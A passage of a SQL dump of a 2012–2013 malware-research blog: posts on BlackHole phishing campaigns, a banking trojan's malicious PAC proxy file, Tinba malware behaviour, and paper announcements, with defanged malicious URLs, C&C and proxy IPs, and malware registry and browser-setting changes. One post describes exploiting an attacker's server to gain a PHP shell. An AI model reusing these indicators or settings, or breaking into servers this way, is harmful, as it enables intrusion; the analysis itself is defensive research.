resistant coding.  In this edition, we talk about a generic approach of coding to subvert the automated log harvesting process in C&C panels.\n\nEdition 7: (Paper) - Extending SQL Injections using Buffer Overflows: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-007.pdf - The seventh edition was released in October 2011. In this edition, I wrote another paper collaboratively with my colleague Rohit Bansal and my adviser Dr. Enbody on the issue of exploiting blind sql injections in web applications that encounter 500 error by using buffer overflow technique. This tactic was developed by Rohit itself.\n\nEdition 8: (Paper) - Exploit Distribution Mechanism in Browser Exploit Packs: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-008.pdf - The eighth edition came out in April 2012. In this edition, I wrote collaboratively with Dr. Enbody on the techniques of exploit distribution in browser exploit packs such as BlackHole, Phoenix, etc.\n\nEdition 9: (Paper) - Game of Windows 32/64 System Takeover - Bot Wars : http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-009.pdf - The ninth edition was released in November 2012. I detailed on the concept of bot wars in which one bot kills other to gain complete access of the infected system.\n\nHitB Magazine is a great place to talk about hacking techniques. I hope this continues and I wish to contribute more in the coming time.\n\nSo, Hack the Box. Cheers !', 'Browser Exploit Packs, Chinese Malware, EZine, Hack In The Box, Hacking, Malware Obfuscation, Redire', 'https://secniche.blogspot.com/2013/01/hack-in-box-hitb-magazine-journey-of.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, '\nVirus Bulletin Papers Added to Respository\n', 'Aditya K Sood', '2013-01-09T09:17:00-08:00', 'We have added the papers to our repository. The newly added ones are:\n\n1. ICE IX Analysis: http://secniche.org/released/VB_ICE_IX.pdf\n\n2. Winlocker Ransomware Analysis: http://secniche.org/released/VB_WINLOCKER.pdf\n\n3. Malware Strategies - Part 1: http://secniche.org/released/VB_MAL_DET_STR_PART1.pdf\n\n4. Malware Strategies - Part 2: http://secniche.org/released/VB_MAL_DET_STR_PART2.pdf\n\nEnjoy !', '', 'https://secniche.blogspot.com/2013/01/virus-bulletin-papers-added-to.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, '\nElsevier Network Security : Abusing Glype Proxies \n', 'Aditya K Sood', '2013-01-09T08:12:00-08:00', 'Update : 29th April 2014\n\nDownload : Paper available here: http://www.slideshare.net/adityaks/abusing-glype-proxies-exploits-and-defences\n\nOur paper on \"Abusing Glype Proxies: Attacks, Exploits and Defenses\" are out in Elsevier Network Security.\n\nAbstract: Proxies play a critical privacy role because these are widely used for anonymous surfing and identity cloaking on the Internet. In addition, proxies also assist in traffic filtering, traffic management, log auditing, access policies and surfing restricted sites. There are several types of proxies available, but the Glype HTTP proxy is used extensively.\n\nThe Glype open-source HTTP proxy is used extensively. However, proxies can be transformed into attack platforms for exploitation. \n\n\n\nFetch: http://www.sciencedirect.com/science/article/pii/S1353485812701125.\n\n\n\nEnjoy!', 'Defences, Exploits, Glype Proxies, Proxifiers.', 'https://secniche.blogspot.com/2013/01/elsevier-network-security-abusing-glype.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, '\nHITB EZine : Bot Wars - The Game of Win32/64 TakeOver\n', 'Aditya K Sood', '2012-12-02T07:19:00-08:00', 'Botnets have been in existence for years. Third Generation Botnets (TGB’s) use sophisticated attack vectors to infect users at a large scale. Botnets are cyber weapons that can jeopardize the integrity and security of the critical infrastructure on the Internet. There is an insidious war going among different generations’ of botnets to exploit the target systems. This concept is termed as bot wars. This article explores the details of bot wars and how the bots kill each other to control the infected systems.\n\nThe paper is out in the 9th edition of HITB Ezine. Fetch the magazine from here: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-009.pdf', '', 'https://secniche.blogspot.com/2012/12/hitb-ezine-bot-wars-game-of-win3264.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, '\nAttribution - Team Cyberthack and The Game of Facebook Phishing Attack - Tracking Back\n', 'Aditya K Sood', '2012-10-10T09:14:00-07:00', 'This Facebook case study is an interesting one and based on the ongoing Facebook phishing attack leading to malware. Interestingly, the attack seems to be launched by the Indonesian and Spanish hackers considering the languages used in the deployed code. Our team came across a Facebook phishing email embedded with a video and other malicious links. Every single URL pointed to a same domain. The Facebook message embedded in the email carried a notification message that says something as follows:\n\n\"\"Miiiii lindoooo! Ahahahaha this videoo muestrezzz not what to nadiesss = $ $ $ $ ZIII? Tiii is for! Because? Yoooo muxiiiisisisisizimoooo amoooo you! Muxo like me will I require your videooo montonezzzz!! porfiz when estez at ............ \"Read more This video was ranked No one under 18.\" \n\nThe original message is presented below:\n\n\"Miiiii lindoooo!!! ahahahaha este videoo no se lo muestrezzz a nadiesss =$$$$ ziii ?? es solo para tiii!! porque ? yoooo te amoooo muxiiiisisisisizimoooo!!! me gusto muxo tu videooo te requiero montonezzzz!!!! porfiz cuando estez en. ..... . .....\" Leer mas\n\nEste video fue clasificado Prohibido para menores de 18 años .\n\nThe phishing email was structured like as shown below:\n\n\n\n\n\n\nBefore looking into the kind of malware served by this phishing attack, let\'s dissect the other relevant information gathered from this malicious domain. The facts are discussed as follows:\n\n1. The domain was compromised by the Cyberthack Team.\n\n\n\n\n2. On analyzing further, we got an information that was embedded somewhere in the web pages about the profile of a user. We cannot say this profile is legitimate or fake at this point of time but, it is worthwhile to look into this. The profile is presented below:\n\n\n\n\n3. Some of the JavaScripts that are used in this malware domain are taken from the - http://cirebon-cyber4rt.blogspot.com/. Guys, tt is always good to remove the comments when you are doing this kind of job.\n\n4. Again, a configuration flaw in the web server running on this malicious domain allowed us to access the\na custom statistics page that pointed out the visitors visiting that link. It is shown below:\n\n\n\n\nThe language used in this page is Spanish. It is easy to decipher the number of visitors that visited this page\n\n\n\n5. The malicious link downloaded facebook.exe executable on the victim machine. Some of the facts\n\n    are listed below:\n\n5.1 The malicious program is written in Visual Basic.\n\n5.2 No packer is used to pack the critical sections. No code obfuscation is used.\n\n5.3 The malicious program used a reference to TortoiseBlame -http://tortoisesvn.tigris.org/blame.html. \n\n      It seems like the malware tries to look legitimate.\n\n5.4 The malware executes silently in the system and on successful installation, opens facebook.com web \n\n      page.\n\n5.5 The malware creates wincal.exe in the %systemroot% folder and uses registry to load it. It is again a \n\n      Visual Basic file. \n\n\n\nFor additional check, the virus total analysis is here: https://www.virustotal.com/file/a64c6d344626ca983979042485a2b8b271ae08f1e411511227700591c2418ac1/analysis/\n\n\n\nStay secure. \n\n\n\nNote: This attack is still active.', '', 'https://secniche.blogspot.com/2012/10/attribution-team-cyberthack-and-game-of.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, '\nDid You Order HDTV from Amazon? - Yes | No, Phishers Targeting Amazon Brand !\n', 'Aditya K Sood', '2012-09-20T20:54:00-07:00', 'The concept is the same so as the attack. This time attackers are using Amazon brand to spread infections on the Internet. The phishing email is drafted really well and shows that an order of ne product (HDTV) has been processed.  The email looks like as follows:\n\n\n \n\n\n\nThe browser is redirected to the web page showing the notification as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThe script looks like as shown below:\n\n\n\n\n\n\n\nThe deobfuscation results in the following code.\n\n\n\n\n\n\n\n\n\nAgain, the iframe loads content from third-party domain hosting Browser Exploit Pack (BEP). The interesting fact is that, we received a number of emails within a span of time. Every new phishing email has a new embedded URL as follows:\n\n\n\nhxxp://shuraki.com/wp-admin/hdtvamazon.html [WordPress]\n\nhxxp://swishmedia.ca/clients/amazinhdtv.html [Generic]\n\nhxxp://tainguyenso.com/admincp/amazinhdtv.html [V Bulletin]\n\n\n\nThese emails look very genuine and authentic. It is highly advised that to be paranoid and think twice before interacting with these emails.\n\n\n\nCheck previous post about LinkedIn Phishing Attack - http://secniche.blogspot.com/2012/08/linekedin-invitation-phishing-blackhole.htmlhttp://secniche.blogspot.com/2012/08/linekedin-invitation-phishing-blackhole.html', '', 'https://secniche.blogspot.com/2012/09/did-you-order-hdtv-from-amazon-yes-no.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, '\nElsevier\'s Computer Network Journal - Understanding the Design of SpyEye Botnet\n', 'Aditya K Sood', '2012-09-20T20:03:00-07:00', 'We have contributed a paper on complete details of SpyEye design in Elsevier\'s Computer Network journal.\n\nAbstract: \"Botnet malware is improving with the latest (3rd) generation exemplified\n by the SpyEye and Zeus botnets. These botnets are important to \nunderstand because they target online financial transactions, primarily \nwith banks. In this paper, we analyze the components from multiple \ngenerations of the SpyEye botnet in order to understand both how it \nworks and how it is evolving. SpyEye is a sophisticated piece of malware\n with a modular design that eases the incorporation of improvements. We \nwill discuss in detail the complete framework of SpyEye botnet \nconsisting of the Bot Development Kit (BDK), the plugin architecture, \nthe backend storage server, the bot design and the web-based Command and\n Control (C&C) management system. In addition, we also examine the \ntechniques used by SpyEye to steal money.\"\n\nThe paper is still in press but can be found at: http://www.sciencedirect.com/science/article/pii/S1389128612002666.\n\nEnjoy!', '', 'https://secniche.blogspot.com/2012/09/elseviers-computer-network-journal.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, '\nInsidious Banking Malware and Proxy-auto Config (PAC)  - A Step towards Mal-Proxying\n', 'Aditya K Sood', '2012-09-17T19:55:00-07:00', 'Recently, our team came across an interesting sample of banking malware which exploits the proxy-auto-config (PAC) functionality in the browsers. Let\'s see what we have:-\n\nWhat is PAC?\nPAC is a technique to implement proxy configurations based on the rules provided in the configuration file. The browser chooses the appropriate proxy server for the configured URLs. PAC is implemented in a sandbox and few JavaScript functions are allowed to be used in the PAC files. For more details about PAC, the excellent resource is here - http://findproxyforurl.com/why-pacwpad/ . PAC uses FindProxyForURL() function to implement this functionality. Have a look at one of the example listed here: http://findproxyforurl.com/example-pac-file/.\n\nWhy malware uses PAC?\nThe concept is straightforward. On the infected machine, the malware downloads the obfuscated PAC file from the server. This allows the malware authors to force the rules defined in the PAC file on the active browsers. It means the malware can push the browser to choose a proxy server based on the URL rules configured in the PAC file. In simpler terms, if a user tries to open a banking website, the browser connects to the proxy server and the traffic is routed through it.\n\nLet\'s look into the PAC file used by the banking malware:\n\n\n\nThe file contained an array of elements in the hexadecimal format. The next step is to see what is hidden behind this. Removing \"\\x\" and applying hexadecimal to ASCII converter, we get the elements as shown below:\n\n\n\nSo as expected, we get the domains configured in the PAC file. Whenever, a user opens the domain listed above, the browser connects to the given proxy server and routes the web traffic through it. Interesting !. Let\'s look at the implementation of FindProxyForURL() function.\n\n\n\n\nThe above-referenced code uses shExpMatch - which attempts to match hostname or URL to a specified shell expression, and returns true if matched. More details can be found here: http://findproxyforurl.com/pac-functions/. \n\nvar _0x355ax4=_0x4919[0] : refers to the first element in the array which is the \"PROXY 46.23.77.172\".\n\nif(shExpMatch(_0x355ax3,_0x355ax6)){return _0x355ax4;}; - you know what it means :) . If the domain is matched then force the browser to connect to the given proxy server. The same process goes for the rest of the provided rules.\n\nThis shows that how exactly the malware uses the PAC concept for malicious operations.\n\nEnjoy!.', '', 'https://secniche.blogspot.com/2012/09/insidious-banking-malware-and-proxy.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, '\nMalicious Domain Attribution - The Criticality of Timing\n', 'Aditya K Sood', '2012-09-08T19:41:00-07:00', 'In this post, we are going to talk about the importance of time factor in attribution of malicious domain. The  \"malicious domain attribution\": it means the different set of characteristics that are mapped or analyzed to gain control of the malicious domain. It is very critical from analysis perspective. Yesterday, we had a very interesting case about the malicious domain attribution. There are certain facts that are required to be understood for executing reverse attacks on the malicious domains. We have found that timing plays a crucial role in successfully attributing the malicious domains. What happened exactly ?\n\nStep 1: We received a FedEx Phishing email embedded with some malicious links. \nStep 2: The source of the phished email was analyzed and related information was collected.\nStep 3: The links were traced to understand the source of the problem.\nStep 4: The browser was redirected to malicious domain (First Hop) having obfuscated code in it.\nStep 5: The obfuscated code was deobfuscated and we were served with a dynamic iframe code.\nStep 6: On tracing the source in malicious iframe, the browser fetched an obfuscated code from      \n             the BlackHole - Browser Exploit Pack (BEP) hosted on other domain (Second Hop).\nStep 7: The code served by BlackHole BEP was again obfuscated, which on deobfuscation provided\n             a plugin detection JavaScript that fingerprinted the versions of various installed plugins.\nStep 8: A malicious JAR was framed inline during fingerprinting of the browser plugins.\nStep 9: On successful exploitation of a Java vulnerability, an executable file was served.\n\nActors - BlackHole, Cridex Trojan.\nCompromised Domains - Word Press website.\n\nThe communication flow is presented below:\n\n\n\n\n\n\nInteresting Technique: HTTP Parameter Iteration\nIt is a simple technique in which HTTP parameters are iterated with different numbers to see if we get a different output or not. For example:- this technique is fruitful when the analyst wants to verify that a malicious link allows different files to be downloaded from the same URL. Sometimes this technique is worth giving a shot. We followed the same process and got same executables with different names as shown below:\n\n\n\n\n\n\nWe have the executable files, the JAR files and other information. At this point, the complete infection scenario is presented. What else? Do we have to stop here after the analysis? We don\'t believe so. What should be the target now? Exactly- finding vulnerabilities in the server hosting malicious websites. Fortunately, we found a vulnerability in the server that allow us to access a PHP shell on the server as follows:\n\n\n\n\nWe started looking for configuration files as shown below: \n\n\n\n\nAfter all this point, we had an access to server (First Hop) hosting the initial infection page. But, this process did not came out to be that fruitful as we were expected.  We were in hurry to find the access information or other critical data that provided us with complete control. Unfortunately, this time the attacker was still active on the malicious domain. As a result, within no time, we were getting forbidden messages ( no further access to the server). Ofcourse, the attacker came to know that the server has been compromised.  The attacker removed the content from the server. The result is shown below:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThat\'s the complete information of the case that we encountered recently. Now the questions, thinking points and lessons to be learned are as follows:\n\n1. Time window plays a critical role in these types of cases. \n    Do we have to act stealthy? Should we wait for sometime if we get an access to the malicious\n    server? \n\n2. The time gap (window) or reaction time definitely impacts the analysis.\n    Is this right to explore the malicious server right away without waiting?\n\nAt this point, we believe that it is a problem of choice, a kind of double edged sword.But for sure, we made a choice not to wait further and act in a dormant manner. Our decision was not that fruitful but it helped us to learn the importance of time window in performing attribution of malicious domains.\n\nIf you have other views, please share :) We will be more than happy to discuss our experiences.', '', 'https://secniche.blogspot.com/2012/09/malicious-domain-attribution.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, '\nIntuit Phishing Campaign - Mighty BlackHole in Action\n', 'Aditya K Sood', '2012-08-28T10:28:00-07:00', 'Intuit phishing campaign has been started today. The structure and concept of the attack is the same as discussed earlier. Let\'s dissect the details of this campaign. The email comes to your inbox in the format as presented below:\n\n\n\n\nThe accompanied link is : hxxp://numerodedicato.altervista.org/blog/wp-content/uploads/fgallery/updint.html. On visiting the link, the user finds a webpage with a following layout:\n\n\n\n\nThe message looks interesting. The webpage is executing another JavaScript to load content from another third-party domain. The details of this deobfuscated script are present here: http://pastebin.com/MVCH8M3N\n\nThe obfuscation provided us with an iframe that is downloading content from the following URL: hxxp://roadmateremove.org/main.php?page=9bb4aab85fa703f5\n\nThe obfuscated plugin script is here : http://pastebin.com/biZnVwMD\nThe deobfuscated plugin script is here :  http://pastebin.com/hsKKn6EP\n\nMany of the AV engines shows this website as benign. But, this domain hosting a BH exploit Pack. Let\'s see further:\n\nOn deobfuscation we get an applet code as follows:\n\n\n\n\nSomething seems suspicious, with Pre.jar file here. Further, the request to this link : hxxp://roadmateremove.org/data/hhcp.php?c=8896e loads the iframe for the plugin detection code. On successful verification and fingerprinting the Pre.jar file is served on the vulnerable systems. A quick check on virus-total only provides a reference to Blackhole exploit.\n\nCheck: https://www.virustotal.com/file/65ac3d0ef75cad088c80bcb238fe6206c42866a8e73676f5b5dd6b235871f874/analysis/1346173365/\n\nDefinitely a Java exploit in action.\n\nThis analysis is based on a specific link accompanied with this sample. The embedded links might change with other phishing emails.\n\nBe Secure.', '', 'https://secniche.blogspot.com/2012/08/intuit-phishing-campaign-mighty.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, '\nLinkedIn Invitation Phishing - BlackHole in Action (2)\n', 'Aditya K Sood', '2012-08-07T09:58:00-07:00', 'Last time we discussed about the LinkedIn phishing attack, here - http://secniche.blogspot.com/2012/06/linkedin-phishing-attack-exploit.html. Within last 2-3 days, there has been significant increase in LinkedIn invitation emails which are malicious in nature. The attackers are exploiting the brand names as discussed earlier in our post on At&T Phishing attack here: http://secniche.blogspot.com/2012/08/at-phishing-attack-blackhole-back-in.html.\n\nThe Linkedin phishing attack is again based on the same pattern and some of the details are discussed in this post. The phishing email layout is presented below:\n\n\n\n\n\n\nVisiting the link resulted in following message.\n\n\n\n\n\n\n\n\n\nThe execution process is the same as discussed earlier in the phishing attacks. The deobfuscated script is shown below:\n\n\n\n\n\n\n\nThe HTML content of the phishing email is here: http://pastebin.com/tbyxaEXs.\n\n\n\nThe complete script is here: http://pastebin.com/kvnvMrma\n\n\n\nThe script patterns are the same except the the URL of the malicious domain varies. Just be proactive and be paranoid in interacting with these types of emails.', '', 'https://secniche.blogspot.com/2012/08/linekedin-invitation-phishing-blackhole.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, '\nAT&T Phishing Attack - BlackHole Back in Action\n', 'Aditya K Sood', '2012-08-06T17:56:00-07:00', 'Attackers are using legitimate organizations\' brand names to distribute phishing emails to a large sections of users. This time AT&T brand name is used to deliver phishing emails. We  have been receiving these emails continuously. These first attempt made by the phisher was failed because the injected links were not embedded in a right manner which results in useless phishing attempt. The very next day, we received the similar email but this time phishers were right at the target. The second time email contained malicious links. Let\'s have a look at the phishing email message:\n\n\n \n\n\n\nOn surfing the embedded links, the browsers was forced to visit the malicious domain as presented below:\n\n\n\n\n\nThis page contains obfuscated malicious iframe that renders dynamically to load a plugin detection script from third-party domain that fingerprinted the users\' environment and served the required exploit. Blackhole BEP exploit has been used to distribute exploits against vulnerable browsers and plugins. The iframe loads the webpage which contains plugin detection script. The page shows a redirection message as follows:\n\n\n\n\n\n\n\n\n\nThe HTML content of the phishing email is pasted here - http://pastebin.com/epGAx7fr\n\n\n\nThe malicious script (deobfuscated) can be found here : http://pastebin.com/Ne4j5zmd\n\n\n\nThis link - hxxp://voicecontroldevotes.info/main.php?page=6df8994172330e77 loads the plugin fingerprinting script and connects back with BlackHole BEP.\n\n\n\nThis host (IP) has been used to register different domain names that have been used for spreading malware using BlackHole. Query here - http://www.malwaredomainlist.com/mdl.php?search=78.87.123.114&colsearch=All&quantity=50\n\n\n\n\n\nThese emails are delivered as legitimate and spam detection engine fails to provide any protection. Try not to fall prey to these phishing attempts.', '', 'https://secniche.blogspot.com/2012/08/at-phishing-attack-blackhole-back-in.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, '\nVirus Bulletin - ICE IX Bot Paper\n', 'Aditya K Sood', '2012-08-06T07:39:00-07:00', 'This month, we have published a paper on ICE 1X analysis in virus bulletin magazine.\n\nAbstract: The ICE IX bot is considered to be a descendent of the\nZeus botnet because it uses some of Zeus’s source code. ICE IX communicates using the HTTP protocol, so it can be considered to be a third generation botnet. While it has been used for a variety of purposes, a major threat of ICE IX comes from its manipulation of banking operations on infected machines. As with any bot, infection results in establishing a master-slave relationship between the\nbotmaster and the compromised machine\"\n\nSubscribe the magazine : http://www.virusbtn.com/virusbulletin/archive/2012/08/vb201208-ICE-bot\n\nThe paper will be released on the website after the contractual obligations are over.\n\nEnjoy!', '', 'https://secniche.blogspot.com/2012/08/virus-bulletin-ice-ix-bot-paper.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, '\nDigital Forensics Magazine - Dismantling SMS based Two-factor Authentication - Malware\n', 'Aditya K Sood', '2012-08-02T05:48:00-07:00', 'We have recently published details of SMS based Two-factor authentication attack used by the Third Generation Botnets (TGBs) in which both system and mobile platforms are exploited. If you remember, Spitmo, Zitmo and other variants are used to accomplish this kind of attack.\n\n\nOutline: \"Malware is impacting the security and integrity of the World Wide Web especially for banks and financial institutions. This article looks at a new exploitation technique used by malware to circumvent two-factor authentication.\"\n\nAbout DF: \"Digital Forensics Magazine is a quarterly features and news magazine \nfrom the world of computer and cyber crime and digital forensics.\"\n\nRight now, magazine is available for subscribers only,but you can also read it online by creating an account.\nhttp://www.digitalforensicsmagazine.com/index.php?option=com_content&view=article&id=792&Itemid=1\n\n\nEnjoy !', '', 'https://secniche.blogspot.com/2012/08/digital-forensics-magazine-dismantling.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, '\nDEFCON 20 - Botnets Die Hard - Owned and Operated\n', 'Aditya K Sood', '2012-07-29T05:47:00-07:00', 'DEF CON 20 - Botnets Die Hard - Owned and Operated \n\n\nSlides can be downloaded from: http://www.secniche.org/presentations/defcon_20_las_vegas_2012.pdf\n\n\n\nEnjoy !', '', 'https://secniche.blogspot.com/2012/07/defcon-20-botnets-die-hard-owned-and.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, '\nHOPE 2012 Presentation - Advancements in Botnet Attacks\n', 'Aditya K Sood', '2012-07-15T10:55:00-07:00', 'Advancements in Botnet Attacks \n\n\n\n\n\nThe presentation can be downloaded from: \nhttp://www.secniche.org/presentations/hope_2012_new_york_adityaks.pdf', '', 'https://secniche.blogspot.com/2012/07/hope-2012-presentation-advancements-in.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, '\nIEEE Security and Privacy (PrePrint) - Targeted Cyber Attacks - A Superset of APTs\n', 'Aditya K Sood', '2012-07-02T10:49:00-07:00', 'Our paper on \"Targeted Cyber Attacks - A Superset of Advanced Persistent Threats\" is available in preprint  at:\n\nhttp://www.computer.org/csdl/mags/sp/preprint/msp2012990114-abs.html \n\nAbstract - Cybercrime increasingly impacts the online world, and targeted attacks \nare playing a significant role in disrupting the online social and \neconomic model. In addition, nations are facing threats as a result of \ntargeted attacks. In this paper we examine a variety of components and \ntechniques that are brought together to bring about targeted attacks.\n\nI will update the details once it is published as a part of hard copy.', '', 'https://secniche.blogspot.com/2012/07/ieee-security-and-privacy-preprint.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, '\nBlackHole + Java Array Exploit  - Rising High\n', 'Aditya K Sood', '2012-07-01T07:39:00-07:00', 'During our analysis, we have seen that several of the websites have been infected with obfuscated JavaScripts that point to one or the other Browser Exploit Pack (BEP). Typically, BlackHole is the primary weapon for automated infections using Drive-by-download attacks. Recently, another high traffic website is found to be running malicious script that is loading BlackHole to trigger infection.Java array exploit is on rise nowadays. Microsoft has discussed about the details of this vulnerability at: http://blogs.technet.com/b/mmpc/archive/2012/03/20/an-interesting-case-of-jre-sandbox-breach-cve-2012-0507.aspx.The obfuscated script is present here - http://pastebin.com/nVQcmMsM. The script deobfuscates to the following code as follows:The URL\'s are designed to use no-ip or dynamic dns service. According to Wikipedia, \"Dynamic DNS or DDNS is a method of updating, in real time, a Domain Name System (DNS) to point to a changing IP address on the Internet. This is used to provide a persistent domain name for a resource that may change location on the network.\"We mapped the required IP and doing some behavioral analysis, a plugin detection script was found as present on the following lnk:Obuscated Code  - http://pastebin.com/rK0NaAMh.Deobfuscated Plugin Detection code -  http://pastebin.com/QxiXVRcGThe code fingerprints the browser for running different set of plugins. On finding the vulnerable version of Java plugin, the script downloads the malicious jar file running specific Java exploit.The decompiled code is present here: http://pastebin.com/5FWMUEtPJava exploits have become popular. We have also discussed earlier about top 5 Java exploits here: http://secniche.blogspot.com/2011/05/finest-5-java-exploit-on-fire.html.Java array indexing vulnerability is the new kid in the town. Refer vulnerability -  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0507.', '', 'https://secniche.blogspot.com/2012/07/blackhole-java-array-exploit-rising.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, '\nDigging Inside Tinba Malware - A Walkthrough\n', 'Aditya K Sood', '2012-06-14T13:07:00-07:00', 'Two weeks back, Tinba malware hit the internet. Though our team spent some time in looking at the various artifacts of Tinba malware. Zeus and SpyEye have given birth to new breed of botnets. The upcoming generation of botnets are extensively utilizing the tactics introduced by Zeus and SpyEye. Tinba is a small notorious malware that aimed specifically for stealing information from the browsers. For more details about Man-in-the-Browser (MitB), one can read our paper on FormGrabbing here - http://www.virusbtn.com/virusbulletin/archive/2011/11/vb201111-form-grabbing.\n\nOther researchers have presented details about Tinba which can be found here - http://www.csis.dk/en/csis/news/3566/\n\nWe looked specifically at communication patterns of Tinba. As we know, bots are hooking browsers and performing Web Injects to gain control over the browser communication channel. Other interesting facts about Tinba is as follows:\n\n\nThe accompanied binary is written in MASM/TASM and having size of 20 KB. Compiling with MASM reduces the size of the binary to great extent.\nThe binary executes as : tinba.exe --- bin.exe --- readme.exe --- winver.exe The dropper actually installs the bin.exe file in the application directory and then deletes the wrapper (binary). File bin.exe resides in the directory permanently.\nAdds run entry here - HKCU\\Software\\Microsoft\\Window\\CurrentVersion\\Run\nTinba hooks browser processes and make them unstable, so there is a possibility that users might encounter several crashes in browsers while running or surfing internet. The browser works   fine when the system is rebooted. \nAs the tinba injects in explorer.exe, the binding occurs very fast when bot has to send SYN packet and to receive reply from the C&C server. The connection is continuous but TCPView is not fruitful in this case because the connection open and closes readily. TDIMon tools gives you the low level traffic details by inspecting the Transport Driver Interface as presented below:\n\nexplorer.exe:168    TDI_CONNECT    TCP:0.0.0.0:2552    82.165.37.127:80    SUCCESS        explorer.exe:168    TDI_SEND    TCP:0.0.0.0:2552    82.165.37.127:80    SUCCESS-2941    Length:353     explorer.exe:168    TDI_SEND    TCP:0.0.0.0:2552    82.165.37.127:80    SUCCESS-2942    Length:9     explorer.exe:168    TDI_EVENT_CHAINED_RECEIVE    TCP:0.0.0.0:2552    82.165.37.127:80    SUCCESS        explorer.exe:168    TDI_EVENT_DISCONNECT    TCP:0.0.0.0:2552    82.165.37.127:80    SUCCESS    RELEASE explorer.exe:168    TDI_SEND    TCP:0.0.0.0:2545    82.165.37.127:80    SUCCESS    Length:353     explorer.exe:168    TDI_SEND    TCP:0.0.0.0:2545    82.165.37.127:80    SUCCESS    Length:9     explorer.exe:168    TDI_EVENT_RECEIVE    TCP:0.0.0.0:2545    82.165.37.127:80    SUCCESS         explorer.exe:168    TDI_EVENT_DISCONNECT    TCP:0.0.0.0:2545    82.165.37.127:80    SUCCESS    RELEASE     \n    \nOne can notice that the events are happening very fast. The below presented figure shows the TCP/IP pattern in injected explorer.exe process.\n\n\n\nTinba Hooking Explorer - TCP/IP Pattern\n\n\nWhen forms are submitted over HTTP/HTTPS, \nthe Firefox raises an alert box for notifying user about communication \nprotocol in use. Internet explorer uses the concept of Zones. So we \nlooked at this pattern in Tinba. No doubt for Internet Explorer, Tinba modifies the registry entry to disable configuration of Zones.as follows:\n\n\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\n\nTinba also manipulates the Firefox behavior by tampering user.js (preferences) file as follows\n\n[C] user_pref(\"security.warn_submit_insecure\",false); \nBrowser does not raise an alert box when information in sent over HTTP while submitting forms.\n[C] user_pref(\"security.warn_viewing_mixed\",false); : \nRemove the warning of supporting mixed content over SSL.\n\nThe aim behind this modification is to remove the ambiguity in the communication channel used by Tinba. Let\'s have a look at the traffic communication:\n\n\n\nTinba Sending POST Requests\n\n\n\nTinba Sending GET Requests\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEncrypted Reply\n\nThe communication is encrypted and well managed in this case. Another interesting thing we noticed during analysis is that, when you reboot your infected system with Tinba, it raises windows integrity check which shows that Tinba has seriously altered the integrity of system32 files such as winver.exe\n\n\n\nWindow Integrity Check on System Infected with Tinba on Every Reboot\n\nThis adds some more information on the Tinba malware.\n\nSome more next time !', '', 'https://secniche.blogspot.com/2012/06/two-weeks-back-tinba-malware-hit.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, '\nLinkedIn Phishing Attack - Dissecting Attack and Used Exploit\n', 'Aditya K Sood', '2012-06-13T14:26:00-07:00', 'Recently, after the successful intrusion of linked-in network by attackers, phishers also started exploiting the trust of users by sending phishing emails with embedded malicious links. The linked-in is on bit roll nowadays by attackers but it is always good to analyze the phishing attack. Our team received the phished linked-in emails. Of-course if you are in malware analysis field you are always targeted one or the other way. It happens. Let\'s discuss the exploit in action in this phishing attack. The users receive following email as presented in the figure below:\n\n\n\n\n\nThe users who received this email are presented below:\n\n\n \n\n\n\nThe malicious links accompanied with this email are presented as:\n\n\n\n\nThe phished email is embedded with more than 2 malicious links.The index.html retrieves 2 JS files from two different domains as presented below\n\n\n\n\n \nOn successfully loading of JS files, the webpage redirects to the target pointed by document.location call. The target URL is actually NGINX reverse proxy which communicates back with blacklisted IP serving malware. The attacker is almost using 3-4 hops to retrieve the malicious content. On detecting the hosts, we found that some of the links are now down or giving forbidden access. However, the targets can be accessed by querying directly with the IP address of the host and not the DNS. The exploit used during this campaign might vary with time but we encountered the script that triggered flash/adobe exploit that uses JavaScript heap spraying. The obfuscated script used in this case is bit complex but not a hard target to deobfuscate. The obfuscated script (redacted) looks like as presented below\n\n\n\n\nThe script is too big 